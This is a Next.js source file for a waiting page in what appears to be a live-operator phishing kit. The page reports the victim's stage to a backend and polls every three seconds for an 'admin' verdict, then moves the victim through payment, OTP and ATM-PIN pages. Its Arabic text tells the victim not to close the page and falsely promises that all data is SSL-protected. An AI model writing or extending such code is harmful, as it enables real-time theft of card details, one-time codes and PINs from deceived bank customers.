"use client";
export const dynamic = 'force-dynamic';
import { useEffect, useRef } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import SessionTracker from "@/components/SessionTracker";

const GREEN = "#1e7344";

export default function LoadingPage() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const from = searchParams.get("from") || "payment"; // payment | otp | atm
  const pollingRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    // رسالة للأدمين بأن العميل في صفحة التحميل ينتظر
    fetch('/api/session', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ current_page: 'loading-page', waiting_for: from }),
    }).catch(() => {});

    // Polling كل 3 ثوانٍ لانتظار قرار الأدمين
    pollingRef.current = setInterval(async () => {
      try {
        const res = await fetch('/api/ping', { method: 'POST' });
        const data = await res.json();
        if (!data.ok) return;

        const redirectTo = data.redirect_to;
        const status = data.status;

        // إذا كان هناك redirect محدد من الأدمين
        if (redirectTo && redirectTo !== '/loading-page') {
          clearInterval(pollingRef.current!);
          router.push(redirectTo);
          return;
        }

        // منطق القبول/الرفض حسب المرحلة
        if (status === 'approved') {
          clearInterval(pollingRef.current!);
          if (from === 'payment') {
            router.push('/otp');
          } else if (from === 'otp') {
            router.push('/atm');
          } else if (from === 'atm') {
            router.push('/success');
          }
        } else if (status === 'rejected') {
          clearInterval(pollingRef.current!);
          if (from === 'payment') {
            router.push('/payment?rejected=1');
          } else if (from === 'otp') {
            router.push('/otp?rejected=1');
          } else if (from === 'atm') {
            router.push('/atm?rejected=1');
          }
        }
      } catch {}
    }, 3000);

    return () => {
      if (pollingRef.current) clearInterval(pollingRef.current);
    };
  }, [from, router]);

  return (
    <div style={{ backgroundColor: "#f7f8fa", display: "flex", justifyContent: "center", alignItems: "center", minHeight: "100vh", flexDirection: "column", padding: "20px" }}>
      <SessionTracker page="loading-page" />
      <div style={{ background: "#fff", width: "100%", maxWidth: "400px", borderRadius: "25px", padding: "40px 20px", boxShadow: "0 10px 30px rgba(0,0,0,0.05)", textAlign: "center" }}>

        {/* Spinner */}
        <div style={{
          width: "65px", height: "65px",
          border: "6px solid #e0e0e0",
          borderTop: `6px solid ${GREEN}`,
          borderRadius: "50%",
          margin: "0 auto 30px",
          animation: "spin 1s linear infinite"
        }} />

        <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>

        <h2 style={{ fontSize: "22px", color: "#333", marginBottom: "15px", fontWeight: "bold" }}>جاري معالجة الطلب...</h2>
        <p style={{ fontSize: "14px", color: "#666", lineHeight: "1.8", marginBottom: "20px" }}>
          يرجى الانتظار، جاري التحقق من بياناتك وإتمام عملية الدفع.
          <br />
          <strong style={{ color: "#e74c3c" }}>لا تغلق الصفحة أو تضغط على زر الرجوع</strong>
        </p>

        <div style={{ marginTop: "25px", paddingTop: "20px", borderTop: "1px solid #eee", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px" }}>
          <img src="https://i.ibb.co/rKgZj74W/IMG-20260323-WA0008.jpg" style={{ width: "100%", maxWidth: "280px", height: "auto", borderRadius: "8px" }} alt="Secure" />
          <span style={{ fontSize: "12px", color: "#888" }}>🔒 جميع بياناتك محمية بتشفير SSL</span>
        </div>
      </div>
    </div>
  );
}
